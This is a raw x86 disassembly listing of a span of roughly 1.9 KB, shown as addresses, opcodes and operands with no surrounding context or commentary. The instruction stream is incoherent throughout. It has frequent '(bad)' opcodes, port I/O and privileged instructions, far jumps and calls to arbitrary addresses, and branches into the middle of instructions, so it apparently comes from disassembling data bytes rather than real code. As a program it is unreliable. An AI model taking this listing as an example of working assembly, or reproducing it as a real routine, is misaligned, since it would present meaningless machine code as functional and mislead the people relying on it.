  420a54:	fnstcw WORD PTR [ecx+0x6e]
  420a57:	xchg   BYTE PTR [edx+0x4c],dl
  420a5a:	inc    eax
  420a5b:	dec    esp
  420a5c:	dec    edx
  420a5d:	into   
  420a5e:	xchg   ah,dl
  420a60:	aas    
  420a61:	cmp    ah,cl
  420a63:	cdq    
  420a64:	inc    ebp
  420a65:	call   0x1a188236
  420a6a:	add    bh,BYTE PTR [edx-0x14]
  420a6d:	or     edi,DWORD PTR [ebx+0x71553d37]
  420a73:	jne    0x420a22
  420a75:	(bad)  
  420a76:	repnz leave 
  420a78:	(bad)  
  420a79:	shl    BYTE PTR [edx+0x4f],1
  420a7c:	dec    esp
  420a7d:	(bad)  
  420a7e:	sbb    ah,BYTE PTR [edi]
  420a80:	mov    ah,0x66
  420a82:	int    0x47
  420a84:	idiv   dh
  420a86:	popf   
  420a87:	stos   BYTE PTR es:[edi],al
  420a88:	or     BYTE PTR [ebp-0x7bc6636],bl
  420a8e:	mov    bh,0xd5
  420a90:	cmp    DWORD PTR ds:0xa7f66f62,ecx
  420a96:	sbb    BYTE PTR [ebx-0x29],0x15
  420a9a:	test   bl,bh
  420a9c:	lods   al,BYTE PTR ds:[esi]
  420a9d:	cs jl  0x420abc
  420aa0:	rcr    DWORD PTR [edi],1
  420aa2:	pop    edx
  420aa3:	ja     0x420af5
  420aa5:	dec    eax
  420aa6:	mov    al,ds:0x46505b74
  420aab:	pop    ss
  420aac:	cmp    cl,BYTE PTR [eax-0x7b]
  420aaf:	outs   dx,BYTE PTR ds:[esi]
  420ab0:	xor    al,0xe1
  420ab2:	mov    dh,0x92
  420ab4:	cmp    al,0x4a
  420ab6:	sub    eax,0xc8cf852
  420abb:	lods   eax,DWORD PTR ds:[esi]
  420abc:	pop    esi
  420abd:	dec    esi
  420abe:	push   esi
  420abf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ac0:	fs stos BYTE PTR es:[edi],al
  420ac2:	imul   ecx,DWORD PTR [edi],0xfffffffa
  420ac5:	add    edx,eax
  420ac7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ac8:	xor    ch,bh
  420aca:	aas    
  420acb:	call   0xd155e96c
  420ad0:	call   0x6c4db9d7
  420ad5:	(bad)  
  420ad6:	lahf   
  420ad7:	jmp    FWORD PTR [ebx+0x38e07efa]
  420add:	outs   dx,DWORD PTR ds:[esi]
  420ade:	popa   
  420adf:	shl    BYTE PTR ss:[ecx+ebp*8-0x658a3b0],1
  420ae7:	jl     0x420ab5
  420ae9:	xor    esp,eax
  420aeb:	jmp    0xb0f9:0x7f31e213
  420af2:	adc    ebx,edi
  420af4:	sbb    al,0xcc
  420af6:	push   ebp
  420af7:	sbb    edx,DWORD PTR [esi-0x19]
  420afa:	inc    dh
  420afc:	aas    
  420afd:	xor    ah,dl
  420aff:	test   DWORD PTR [ecx-0x4e],edx
  420b02:	pop    ebp
  420b03:	stos   DWORD PTR es:[edi],eax
  420b04:	fwait
  420b05:	sahf   
  420b06:	xchg   esp,eax
  420b07:	sub    esp,DWORD PTR [ecx-0x5af43812]
  420b0d:	sbb    ecx,DWORD PTR ss:[edx]
  420b10:	dec    esp
  420b11:	adc    DWORD PTR [eax],edi
  420b13:	arpl   WORD PTR [edi],si
  420b15:	jg     0x420ae8
  420b17:	jnp    0x420ab2
  420b19:	jl     0x420add
  420b1b:	sub    esp,ebx
  420b1d:	push   ds
  420b1e:	push   ebx
  420b1f:	call   0x879676e
  420b24:	fstp   DWORD PTR [ecx*8-0x17cf57a6]
  420b2b:	cmp    DWORD PTR [ecx-0x50160472],0x9cfd6eb3
  420b35:	stos   DWORD PTR es:[edi],eax
  420b36:	sub    ch,BYTE PTR [esi-0x3ad1eb13]
  420b3c:	lods   al,BYTE PTR ds:[esi]
  420b3d:	jo     0x420b2d
  420b3f:	ins    DWORD PTR es:[edi],dx
  420b40:	and    BYTE PTR [ecx+eiz*1-0x6f81b89e],dl
  420b47:	dec    eax
  420b48:	lods   al,BYTE PTR ds:[esi]
  420b49:	icebp  
  420b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b4b:	xchg   ebp,eax
  420b4c:	icebp  
  420b4d:	fsubrp st(4),st
  420b4f:	(bad)  
  420b50:	push   ds
  420b51:	int    0x4c
  420b53:	stos   DWORD PTR es:[edi],eax
  420b54:	mov    WORD PTR [ebp+0x7a331678],ss
  420b5a:	push   esi
  420b5b:	mov    eax,ds:0x9320c069
  420b60:	jno    0x420bcc
  420b62:	dec    esp
  420b63:	(bad)  
  420b64:	packsswb mm4,mm7
  420b67:	push   esp
  420b68:	pop    ds
  420b69:	leave  
  420b6a:	jbe    0x420bca
  420b6c:	(bad)  
  420b6d:	popf   
  420b6e:	aam    0x94
  420b70:	ret    0xf43d
  420b73:	sbb    DWORD PTR [ebp-0x401381e7],ecx
  420b79:	cli    
  420b7a:	mov    ds:0xac8fc1b8,al
  420b7f:	ds cmovb ebx,ebx
  420b83:	xor    BYTE PTR [ecx],bl
  420b85:	adc    DWORD PTR [ebx-0x1a1c777d],esi
  420b8b:	test   BYTE PTR [eax-0x77],al
  420b8e:	(bad)  
  420b8f:	das    
  420b90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b91:	fs jae 0x420bd0
  420b94:	lods   eax,DWORD PTR ds:[esi]
  420b95:	or     al,0xf8
  420b97:	stos   DWORD PTR es:[edi],eax
  420b98:	pusha  
  420b99:	imul   esp,DWORD PTR [eax],0x43
  420b9c:	(bad)  
  420b9d:	sub    DWORD PTR [ebx+0x3f],esp
  420ba0:	add    DWORD PTR [edx],eax
  420ba2:	mov    bl,BYTE PTR [esi]
  420ba4:	ret    0xccd6
  420ba7:	test   al,0xed
  420ba9:	push   edi
  420baa:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  420bac:	sub    ecx,ecx
  420bae:	fcmove st,st(6)
  420bb0:	and    ecx,DWORD PTR [esi]
  420bb2:	rcr    BYTE PTR [eax-0x266d46b0],0x6f
  420bb9:	adc    ebp,DWORD PTR [ecx+0x9]
  420bbc:	in     al,0x96
  420bbe:	int    0xd8
  420bc0:	mov    ah,0x6f
  420bc2:	mov    ah,0x1b
  420bc4:	dec    eax
  420bc5:	adc    eax,0xa95f1f29
  420bca:	mov    esi,DWORD PTR [ecx]
  420bcc:	push   ds
  420bcd:	jne    0x420b9c
  420bcf:	xor    BYTE PTR [edx],cl
  420bd1:	shl    DWORD PTR [ebp+0xa0245c1],1
  420bd7:	inc    eax
  420bd8:	sub    al,BYTE PTR [eax+0x7]
  420bdb:	jae    0x420b8f
  420bdd:	mov    bl,cl
  420bdf:	sub    dl,dh
  420be1:	sub    eax,0x9fb18e96
  420be6:	mov    ebx,eax
  420be8:	dec    esi
  420be9:	aas    
  420bea:	mov    ecx,0x98fc8ce3
  420bef:	pop    eax
  420bf0:	add    cl,ah
  420bf2:	lods   al,BYTE PTR ds:[esi]
  420bf3:	inc    edx
  420bf4:	aam    0x3b
  420bf6:	push   edx
  420bf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bf8:	or     BYTE PTR [ebp+0x46ea570],ah
  420bfe:	es lahf 
  420c00:	lahf   
  420c01:	xchg   esi,eax
  420c02:	push   cs
  420c03:	or     al,0x7f
  420c05:	adc    DWORD PTR [esi],0x43
  420c08:	jge    0x420bd9
  420c0a:	fadd   DWORD PTR [edi]
  420c0c:	mov    al,ds:0x1e6db140
  420c11:	mov    eax,0x6b955577
  420c16:	sahf   
  420c17:	scas   eax,DWORD PTR es:[edi]
  420c18:	outs   dx,DWORD PTR ds:[esi]
  420c19:	mov    ds:0x3644a72b,eax
  420c1e:	sub    al,0xcf
  420c20:	(bad)  
  420c21:	(bad)  
  420c22:	call   0x9b13f1e7
  420c27:	xor    BYTE PTR ds:0x5f002e6a,cl
  420c2d:	jnp    0x420c53
  420c2f:	dec    esp
  420c30:	mov    edx,0xff6b454f
  420c35:	cli    
  420c36:	mov    esp,edx
  420c38:	and    edx,DWORD PTR [ecx]
  420c3a:	and    esp,DWORD PTR [esi+eax*2-0x4d]
  420c3e:	push   cs
  420c3f:	lods   eax,DWORD PTR ds:[esi]
  420c40:	adc    ch,BYTE PTR [edi-0x46]
  420c43:	imul   ebp,DWORD PTR [edi+ebp*1+0x623c6294],0x302c19cf
  420c4e:	iret   
  420c4f:	fsub   DWORD PTR [eax]
  420c51:	jge    0x420c2b
  420c53:	gs loopne 0x420be9
  420c56:	mov    cl,0x2
  420c58:	dec    edx
  420c59:	jecxz  0x420be6
  420c5b:	xchg   esi,eax
  420c5c:	gs dec ecx
  420c5e:	xor    al,bl
  420c60:	cmp    eax,0xc7795309
  420c65:	jne    0x420cbc
  420c67:	test   ebp,edx
  420c69:	xchg   ebx,eax
  420c6a:	in     eax,dx
  420c6b:	mov    bh,0xff
  420c6d:	lock jo 0x420c80
  420c70:	push   eax
  420c71:	test   BYTE PTR [edi],cl
  420c73:	and    bh,dl
  420c75:	jnp    0x420cbb
  420c77:	add    DWORD PTR [eax-0xe],edi
  420c7a:	sub    cl,BYTE PTR [ebx-0x6679da09]
  420c80:	fistp  DWORD PTR [eax+0x10]
  420c83:	adc    eax,DWORD PTR [esi]
  420c85:	loopne 0x420c1d
  420c87:	cmp    BYTE PTR [esi+0x1],bl
  420c8a:	pop    esp
  420c8b:	inc    eax
  420c8c:	sub    ch,BYTE PTR [ecx]
  420c8e:	push   edx
  420c8f:	loope  0x420c4a
  420c91:	out    dx,al
  420c92:	dec    eax
  420c93:	out    dx,eax
  420c94:	sub    al,0xb9
  420c96:	pop    esp
  420c97:	sbb    al,al
  420c99:	loop   0x420cf9
  420c9b:	in     eax,0x2f
  420c9d:	in     al,dx
  420c9e:	sbb    ah,bl
  420ca0:	xchg   ebp,eax
  420ca1:	fnstenv [edx]
  420ca3:	and    cl,dh
  420ca5:	lahf   
  420ca6:	cmp    DWORD PTR [esi+eiz*4-0x27],esp
  420caa:	sti    
  420cab:	jbe    0x420ce8
  420cad:	lock mov ds:0x9f4a4225,al
  420cb3:	xor    edx,DWORD PTR [ebx+0x7523b973]
  420cb9:	shr    BYTE PTR ds:0x54aef94f,cl
  420cbf:	push   esi
  420cc0:	ror    DWORD PTR [edi-0x66],1
  420cc3:	mov    ch,0x4
  420cc5:	cmp    DWORD PTR [edx],0xffffff89
  420cc8:	xchg   ebp,eax
  420cc9:	inc    edi
  420cca:	xor    ebp,esi
  420ccc:	jecxz  0x420c81
  420cce:	jb     0x420c67
  420cd0:	retf   0x73fa
  420cd3:	icebp  
  420cd4:	outs   dx,DWORD PTR ds:[esi]
  420cd5:	jge    0x420d0f
  420cd7:	jle    0x420cc9
  420cd9:	mov    dh,0xbb
  420cdb:	pop    ss
  420cdc:	shl    BYTE PTR [edi],cl
  420cde:	mov    ds:0x2e72a2e3,eax
  420ce3:	cmp    eax,0x28262842
  420ce8:	int3   
  420ce9:	ja     0x420d43
  420ceb:	mov    esi,0x8c709e8e
  420cf0:	test   BYTE PTR [edi-0x3],0x19
  420cf4:	test   DWORD PTR [eax+0x61],eax
  420cf7:	std    
  420cf8:	fdivr  DWORD PTR [eax-0x2b]
  420cfb:	call   0x327f4c3f
  420d00:	in     al,dx
  420d01:	inc    esi
  420d02:	pop    es
  420d03:	add    al,0x23
  420d05:	sbb    al,0x7c
  420d07:	test   DWORD PTR [esi+ebp*2+0x52],ebx
  420d0b:	(bad)  
  420d0c:	add    DWORD PTR [edx+0xc],ebx
  420d0f:	loope  0x420d50
  420d11:	div    BYTE PTR [ecx-0x24217400]
  420d17:	in     eax,dx
  420d18:	out    0xfc,al
  420d1a:	ret    0x4e73
  420d1d:	loop   0x420d17
  420d1f:	scas   al,BYTE PTR es:[edi]
  420d20:	push   ss
  420d21:	out    0x87,al
  420d23:	cs mov al,0xf9
  420d26:	pop    es
  420d27:	inc    eax
  420d28:	pop    edx
  420d29:	loopne 0x420d46
  420d2b:	dec    ebx
  420d2c:	leave  
  420d2d:	mov    al,ds:0xd4080971
  420d32:	pushf  
  420d33:	xchg   esp,eax
  420d34:	add    BYTE PTR [ebp-0x75c64cc3],bl
  420d3a:	inc    ebx
  420d3b:	sti    
  420d3c:	pop    edx
  420d3d:	adc    BYTE PTR es:[eax],dl
  420d40:	jmp    FWORD PTR [edx+edx*2]
  420d43:	pusha  
  420d44:	pop    ecx
  420d45:	dec    esi
  420d46:	cli    
  420d47:	adc    esp,edx
  420d49:	pop    ecx
  420d4a:	gs inc ecx
  420d4c:	mov    ch,0xb6
  420d4e:	sub    al,0xde
  420d50:	sbb    BYTE PTR [ebp+0x27],cl
  420d53:	mov    cl,0x70
  420d55:	fist   DWORD PTR [ebp+eax*1-0x2a86cba4]
  420d5c:	mov    ah,0xda
  420d5e:	jecxz  0x420dd4
  420d60:	pop    ecx
  420d61:	mov    bh,0x58
  420d63:	and    al,0x6c
  420d65:	add    BYTE PTR [edx],cl
  420d67:	sbb    eax,0xb575182d
  420d6c:	retf   0xe938
  420d6f:	push   DWORD PTR [ebx+edi*8+0x32]
  420d73:	(bad)  
  420d74:	scas   al,BYTE PTR es:[edi]
  420d75:	jg     0x420cf8
  420d77:	shl    BYTE PTR [ebx],cl
  420d79:	jmp    0x7fc61bef
  420d7e:	int3   
  420d7f:	jno    0x420dcd
  420d81:	leave  
  420d82:	jb     0x420dd1
  420d84:	cwde   
  420d85:	sub    DWORD PTR [eax+edx*2+0x442b762a],edx
  420d8c:	das    
  420d8d:	or     al,0x79
  420d8f:	xor    DWORD PTR [eax+0x5b51c035],edi
  420d95:	fchs   
  420d97:	inc    ebp
  420d98:	imul   eax,DWORD PTR [ecx-0x16b3b014],0x70acb78c
  420da2:	mov    ch,0x76
  420da4:	add    DWORD PTR [eax+0xf],edi
  420da7:	xchg   ecx,eax
  420da8:	in     al,0xe9
  420daa:	fsub   QWORD PTR [esi]
  420dac:	dec    edx
  420dad:	adc    al,0xf5
  420daf:	jmp    0x420dfd
  420db1:	in     eax,0x67
  420db3:	mov    ecx,edi
  420db5:	in     al,0x55
  420db7:	mov    DWORD PTR [eax+edi*8],esp
  420dba:	fcom   DWORD PTR [ecx]
  420dbc:	and    ecx,ecx
  420dbe:	inc    ebp
  420dbf:	clc    
  420dc0:	das    
  420dc1:	xrelease xchg BYTE PTR [edx-0x758eb41b],bh
  420dc8:	sbb    BYTE PTR [ebx],0x8a
  420dcb:	fs jno 0x420ddd
  420dce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dcf:	cmp    al,0x45
  420dd1:	jae    0x420d63
  420dd3:	add    al,0xf0
  420dd5:	mov    edx,0x7d483853
  420dda:	arpl   cx,si
  420ddc:	out    0x63,al
  420dde:	inc    edx
  420ddf:	lods   eax,DWORD PTR ds:[esi]
  420de0:	mov    ?,WORD PTR [ecx+0x12]
  420de3:	in     eax,dx
  420de4:	sbb    BYTE PTR [ebx+0x2c],al
  420de7:	inc    ebp
  420de8:	xchg   ecx,eax
  420de9:	cmp    BYTE PTR [ecx+0x29],dh
  420dec:	shr    DWORD PTR [ebx-0x66],0xe6
  420df0:	ins    BYTE PTR es:[edi],dx
  420df1:	shl    DWORD PTR [esi],1
  420df3:	mov    edx,0xe7a83aa1
  420df8:	test   eax,0xaa489cd8
  420dfd:	inc    ebp
  420dfe:	loopne 0x420d9e
  420e00:	cmc    
  420e01:	inc    ebx
  420e02:	mov    cl,0xce
  420e04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e05:	adc    eax,0xaf4e7bfe
  420e0a:	iret   
  420e0b:	test   ebp,edx
  420e0d:	mov    DWORD PTR [ebp-0x5b],ebx
  420e10:	sub    dl,BYTE PTR [edi]
  420e12:	sub    eax,0xf352249f
  420e17:	inc    eax
  420e18:	pop    edx
  420e19:	std    
  420e1a:	adc    DWORD PTR ds:0x7afe39ba,ebp
  420e20:	popa   
  420e21:	repnz or BYTE PTR [ebx],dl
  420e24:	and    bl,BYTE PTR [ecx]
  420e26:	xchg   edx,eax
  420e27:	and    al,0x58
  420e29:	jg     0x420e11
  420e2b:	or     eax,0xebc907f9
  420e30:	leave  
  420e31:	in     eax,0x46
  420e33:	adc    dh,BYTE PTR [edx-0x70]
  420e36:	adc    edi,DWORD PTR gs:0x967eea6b
  420e3d:	outs   dx,DWORD PTR ds:[esi]
  420e3e:	jge    0x420e92
  420e40:	cmp    eax,0xfdae3fc7
  420e45:	pop    ebp
  420e46:	iret   
  420e47:	cmp    eax,0x8a75498d
  420e4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e4d:	aaa    
  420e4e:	inc    edx
  420e4f:	in     eax,0xa1
  420e51:	cli    
  420e52:	xchg   DWORD PTR [ecx+0xa],ebp
  420e55:	fstp   TBYTE PTR [eax]
  420e57:	je     0x420e48
  420e59:	cmp    dl,BYTE PTR [ebp+0x2fbcc20]
  420e5f:	jle    0x420de7
  420e61:	adc    esp,DWORD PTR [eax+edi*1]
  420e64:	test   DWORD PTR [ebx],ecx
  420e66:	lock popa 
  420e68:	loope  0x420e48
  420e6a:	scas   eax,DWORD PTR es:[edi]
  420e6b:	cmp    eax,0x26c6aa57
  420e70:	adc    cl,BYTE PTR [ebp+0x10]
  420e73:	xchg   ebx,eax
  420e74:	inc    esp
  420e75:	rol    dl,1
  420e77:	mov    dl,bl
  420e79:	adc    dl,dh
  420e7b:	retf   0xd4f
  420e7e:	in     al,0xcb
  420e80:	ds sub al,0x9b
  420e83:	cmp    al,al
  420e85:	lock cwde 
  420e87:	xor    al,0xf4
  420e89:	inc    ebx
  420e8a:	inc    esi
  420e8b:	les    edi,FWORD PTR [esi+0x5]
  420e8e:	mov    ecx,0x968f9055
  420e93:	mov    esp,0x7fb10c6d
  420e98:	sub    eax,0x19981133
  420e9d:	pop    edx
  420e9e:	pop    ds
  420e9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ea0:	enter  0x63a9,0x6c
  420ea4:	xchg   ecx,eax
  420ea5:	inc    edi
  420ea6:	mov    WORD PTR ds:0x61210b01,ds
  420eac:	nop
  420ead:	imul   edx,DWORD PTR [ecx-0x71337e0b],0xca4fe13f
  420eb7:	mov    dh,0xdb
  420eb9:	or     DWORD PTR [ebp*8-0x5fa22f55],0xdb441c69
  420ec4:	pushf  
  420ec5:	addr16 or ebx,esp
  420ec8:	(bad)  
  420eca:	(bad)  
  420ecb:	nop
  420ecc:	jnp    0x420eee
  420ece:	and    DWORD PTR ds:0xf377a4a1,edi
  420ed4:	cmp    bl,BYTE PTR [ebp-0x781ad4b8]
  420eda:	out    0xeb,al
  420edc:	add    BYTE PTR [edi+0x74],dh
  420edf:	dec    esi
  420ee0:	add    al,0x9c
  420ee2:	(bad)  
  420ee3:	mov    ebp,0xf35b0f7a
  420ee8:	sub    BYTE PTR [ebx+edi*2],ah
  420eeb:	stos   DWORD PTR es:[edi],eax
  420eec:	or     al,0x9c
  420eee:	mov    WORD PTR [edi+ecx*8],gs
  420ef1:	inc    ebx
  420ef2:	cdq    
  420ef3:	pop    edi
  420ef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ef5:	(bad)  
  420ef6:	out    0x52,eax
  420ef8:	pop    ss
  420ef9:	cdq    
  420efa:	pop    ebx
  420efb:	test   DWORD PTR [ebp+0x17],ecx
  420efe:	arpl   WORD PTR [ebx-0x3],di
  420f01:	ret    0xb240
  420f04:	cmp    dh,BYTE PTR [esi-0x2c]
  420f07:	jbe    0x420f29
  420f09:	mov    esp,0xe795c497
  420f0e:	fucomip st,st(2)
  420f10:	push   ebx
  420f11:	stos   BYTE PTR es:[edi],al
  420f12:	jbe    0x420ee8
  420f14:	xchg   ecx,eax
  420f15:	cli    
  420f16:	call   0x50c2:0x4dd5a363
  420f1d:	xor    eax,0x54bfc696
  420f22:	out    dx,al
  420f23:	and    edx,DWORD PTR [edi+ebx*1+0x58]
  420f27:	jmp    DWORD PTR cs:[edx-0xf71c434]
  420f2e:	clc    
  420f2f:	xor    dl,BYTE PTR [ecx]
  420f31:	scas   eax,DWORD PTR es:[edi]
  420f32:	and    BYTE PTR [ebx],ah
  420f34:	pop    es
  420f35:	dec    eax
  420f36:	std    
  420f37:	mov    dl,0x56
  420f39:	cmp    al,0xdd
  420f3b:	test   BYTE PTR [eax],ch
  420f3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f3e:	xor    ch,BYTE PTR [ebx+0x14a38c6f]
  420f44:	mov    BYTE PTR [ebp+0x17cec39],dl
  420f4a:	add    cl,BYTE PTR [edx+0x0]
  420f4d:	(bad)  
  420f4e:	sbb    al,0x36
  420f50:	inc    ebp
  420f51:	into   
  420f52:	sub    al,0x42
  420f54:	js     0x420f73
  420f56:	imul   edx,DWORD PTR [edi],0x21
  420f59:	rcr    DWORD PTR [edx+ebx*2+0x32afe540],1
  420f60:	inc    edi
  420f61:	lods   al,BYTE PTR ds:[esi]
  420f62:	rcl    DWORD PTR [ebp+0x29f3ef99],0x6c
  420f69:	in     eax,0x13
  420f6b:	call   0x49619d16
  420f70:	lods   eax,DWORD PTR ds:[esi]
  420f71:	mov    ch,0xf2
  420f73:	test   al,0x1a
  420f75:	pop    esi
  420f76:	test   eax,0x75068562
  420f7b:	jecxz  0x420fbe
  420f7d:	jno    0x420fb6
  420f7f:	cmp    esi,DWORD PTR [esi+edi*4+0x2f]
  420f83:	mov    dh,al
  420f85:	mov    WORD PTR [ecx],cs
  420f87:	fucom  st(3)
  420f89:	jecxz  0x420f33
  420f8b:	sbb    eax,0x1b997c61
  420f90:	ins    BYTE PTR es:[edi],dx
  420f91:	mov    ds:0x860ee88,al
  420f96:	out    0xff,al
  420f98:	popf   
  420f99:	test   eax,0x418b6b0e
  420f9e:	push   es
  420f9f:	push   ds
  420fa0:	dec    esi
  420fa1:	ins    BYTE PTR es:[edi],dx
  420fa2:	jmp    0x420ffc
  420fa4:	sti    
  420fa5:	lock int3 
  420fa7:	add    eax,0xfffffff6
  420faa:	fsub   st,st(7)
  420fac:	sahf   
  420fad:	ds mov ebx,0xe9b4b5e
  420fb3:	inc    esi
  420fb4:	pop    ss
  420fb5:	repz data16 out 0x7f,al
  420fb9:	mov    edx,edx
  420fbb:	icebp  
  420fbc:	pop    ss
  420fbd:	sbb    al,BYTE PTR [edx]
  420fbf:	xchg   BYTE PTR [ebp-0x5135296c],bh
  420fc5:	outs   dx,BYTE PTR ds:[esi]
  420fc6:	std    
  420fc7:	jge    0x42100e
  420fc9:	cli    
  420fca:	push   es
  420fcb:	xor    ch,bh
  420fcd:	push   esp
  420fce:	cwde   
  420fcf:	pop    ecx
  420fd0:	mov    ebx,0x9b004acd
  420fd5:	push   0x959b877a
  420fda:	aaa    
  420fdb:	jp     0x421023
  420fdd:	loop   0x420f5f
  420fdf:	dec    esp
  420fe0:	lea    esp,[eax-0x5e]
  420fe3:	add    ch,BYTE PTR [edx-0x57bce9d4]
  420fe9:	ror    eax,0xf0
  420fec:	push   ecx
  420fed:	rol    BYTE PTR [edx],cl
  420fef:	push   esp
  420ff0:	push   eax
  420ff1:	pop    es
  420ff2:	adc    ebp,DWORD PTR [edi-0x76567f49]
  420ff8:	mov    bh,0xf2
  420ffa:	dec    ebp
  420ffb:	mov    ds:0x3a4e3c20,eax
  421000:	aaa    
  421001:	pop    ebp
  421002:	outs   dx,BYTE PTR ds:[esi]
  421003:	push   edx
  421004:	test   eax,0x40714585
  421009:	int    0x86
  42100b:	daa    
  42100c:	xchg   edi,eax
  42100d:	daa    
  42100e:	jge    0x420fec
  421010:	repz ja 0x421088
  421013:	mov    edx,0x7941de69
  421018:	nop
  421019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42101a:	jmp    FWORD PTR [esi-0x7c8a0f67]
  421020:	fcom   QWORD PTR [esi-0x43f62b96]
  421026:	sub    al,0x12
  421028:	lea    esp,[edi+0x4751270d]
  42102e:	es dec ebp
  421030:	fidivr DWORD PTR [edi-0x64544594]
  421036:	or     eax,eax
  421038:	and    DWORD PTR [edi+0x7a949f7a],ecx
  42103e:	push   0x9acebefe
  421043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421044:	fsub   QWORD PTR [ebp-0x69]
  421047:	cmp    al,0x66
  421049:	jecxz  0x421072
  42104b:	(bad)  
  42104c:	jae    0x420ff1
  42104e:	inc    ebp
  42104f:	jge    0x421047
  421051:	das    
  421052:	(bad)  
  421054:	dec    esp
  421055:	jo     0x421085
  421057:	xor    BYTE PTR [edx-0x73bd0bb9],cl
  42105d:	mov    al,0xec
  42105f:	dec    ebp
  421060:	pop    es
  421061:	dec    edi
  421062:	int3   
  421063:	sti    
  421064:	or     ch,0x95
  421067:	loopne 0x42100d
  421069:	lods   eax,DWORD PTR ds:[esi]
  42106a:	sub    al,0x49
  42106c:	dec    eax
  42106d:	inc    edi
  42106e:	push   ds
  42106f:	or     DWORD PTR [ebx],ebx
  421071:	test   eax,0xd25d0b80
  421076:	call   0x9e7a:0x8cc3f655
  42107d:	dec    eax
  42107e:	push   ebx
  42107f:	sbb    DWORD PTR [ebp-0x46751ee7],ebx
  421085:	scas   al,BYTE PTR es:[edi]
  421086:	int3   
  421087:	mov    BYTE PTR [edx+0xd],ch
  42108a:	mov    bl,0xe6
  42108c:	ins    BYTE PTR es:[edi],dx
  42108d:	push   0xdc6ec8c1
  421092:	lock inc edi
  421094:	sbb    al,0x60
  421096:	add    al,0xa2
  421098:	push   esi
  421099:	sahf   
  42109a:	jmp    0x42102b
  42109c:	dec    esi
  42109d:	lea    ecx,ds:0x2f92ca8f
  4210a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210a4:	jmp    0x4687395a
  4210a9:	test   al,0xf3
  4210ab:	sub    bh,BYTE PTR [edx-0x46cb20be]
  4210b1:	test   BYTE PTR [edx],dh
  4210b3:	shl    DWORD PTR [ecx],0x51
  4210b6:	repz xchg ebx,eax
  4210b8:	jno    0x42104c
  4210ba:	mov    ebp,0x64b806a8
  4210bf:	repz leave 
  4210c1:	xlat   BYTE PTR ds:[ebx]
  4210c2:	sub    DWORD PTR [esp+eax*1+0x3d384f26],ecx
  4210c9:	rol    DWORD PTR [edi-0x5e9b8ef8],cl
  4210cf:	pop    es
  4210d0:	mov    ?,WORD PTR [ecx+eiz*2-0x42]
  4210d4:	sbb    al,0x9f
  4210d6:	jns    0x42113a
  4210d8:	pop    eax
  4210d9:	adc    esi,DWORD PTR [ecx+0x45]
  4210dc:	xor    eax,DWORD PTR [eax]
  4210de:	jg     0x421086
  4210e0:	mov    ss,WORD PTR [ebp+0x41e66892]
  4210e6:	stc    
  4210e7:	int    0xec
  4210e9:	add    BYTE PTR [ecx-0x2b],ch
  4210ec:	jb     0x421156
  4210ee:	scas   eax,DWORD PTR es:[edi]
  4210ef:	dec    esp
  4210f0:	adc    edi,DWORD PTR [ebx+eiz*2+0x71]
  4210f4:	cmp    DWORD PTR [ebp+esi*4-0x4e],edi
  4210f8:	fisttp QWORD PTR [ebx]
  4210fa:	sahf   
  4210fb:	push   esp
  4210fc:	push   0x56cd4bc1
  421101:	cmp    ecx,ecx
  421103:	jo     0x421176
  421105:	jo     0x421127
  421107:	les    edi,FWORD PTR [edx-0x3eef3da7]
  42110d:	xchg   ecx,eax
  42110e:	inc    ebp
  42110f:	fbld   TBYTE PTR [eax-0x560df683]
  421115:	enter  0xa836,0xe7
  421119:	test   ah,bl
  42111b:	(bad)  
  42111c:	ret    0x6b7a
  42111f:	push   0x44682941
  421124:	int    0x49
  421126:	pop    edi
  421127:	ror    BYTE PTR ds:0x9e57880a,cl
  42112d:	mov    ah,0xfe
  42112f:	ins    DWORD PTR es:[edi],dx
  421130:	mov    eax,ds:0xd2361c28
  421135:	ds mov edi,0x8613312c
  42113b:	mov    BYTE PTR [esp+edi*8-0x38a863bc],dh
  421142:	mov    edx,0xdd419740
  421147:	mov    ch,0xcd
  421149:	inc    ebx
  42114a:	gs jb  0x421138
  42114d:	and    esi,DWORD PTR es:[ebp-0x12]
  421151:	outs   dx,DWORD PTR ds:[esi]
  421152:	(bad)  
  421153:	pop    ebx
  421154:	pop    esp
  421155:	ret    0x165
  421158:	and    bl,bl
  42115a:	loop   0x421100
  42115c:	jmp    0x28e9:0x9455cd76
  421163:	push   esp
  421164:	xlat   BYTE PTR ds:[ebx]
  421165:	pop    esi
  421166:	shl    BYTE PTR [edi-0x13b2a1c1],0x14
  42116d:	fwait
  42116e:	imul   ecx,eax,0xa1bd7d54
  421174:	jle    0x42111f
  421176:	iret   
  421177:	sub    bl,BYTE PTR [edi-0x59150319]
  42117d:	mov    al,0xa2
  42117f:	sbb    BYTE PTR [ebp-0x3a],al
  421182:	popa   
  421183:	dec    esp
  421184:	xchg   ebp,eax
  421185:	cmc    
  421186:	sbb    eax,0xb3be5a15
  42118b:	mov    esi,0x616783be
  421190:	and    BYTE PTR [ecx],0xde
  421193:	or     eax,0xf9afd236
  421198:	in     eax,0x6b
  42119a:	mov    edx,0xdb017f00
  42119f:	mov    ebx,0x9a86c06
  4211a4:	scas   eax,DWORD PTR es:[edi]
  4211a5:	fstp   QWORD PTR [edi-0x5bc66e92]
  4211ab:	inc    eax
  4211ac:	fwait
  4211ad:	pop    ebx
  4211ae:	cli    
  4211af:	mov    al,0xc6
  4211b1:	test   BYTE PTR [ebx],0x1b
  4211b4:	xchg   esi,eax
  4211b5:	fsub   DWORD PTR [eax+0x14]
  4211b8:	(bad)  
  4211ba:	sub    eax,0xb25b07ef
  4211bf:	xor    esi,esi
  4211c1:	fbld   TBYTE PTR [edi-0x10e1b7dd]
  4211c7:	jb     0x4211c6
  4211c9:	sub    ecx,esp
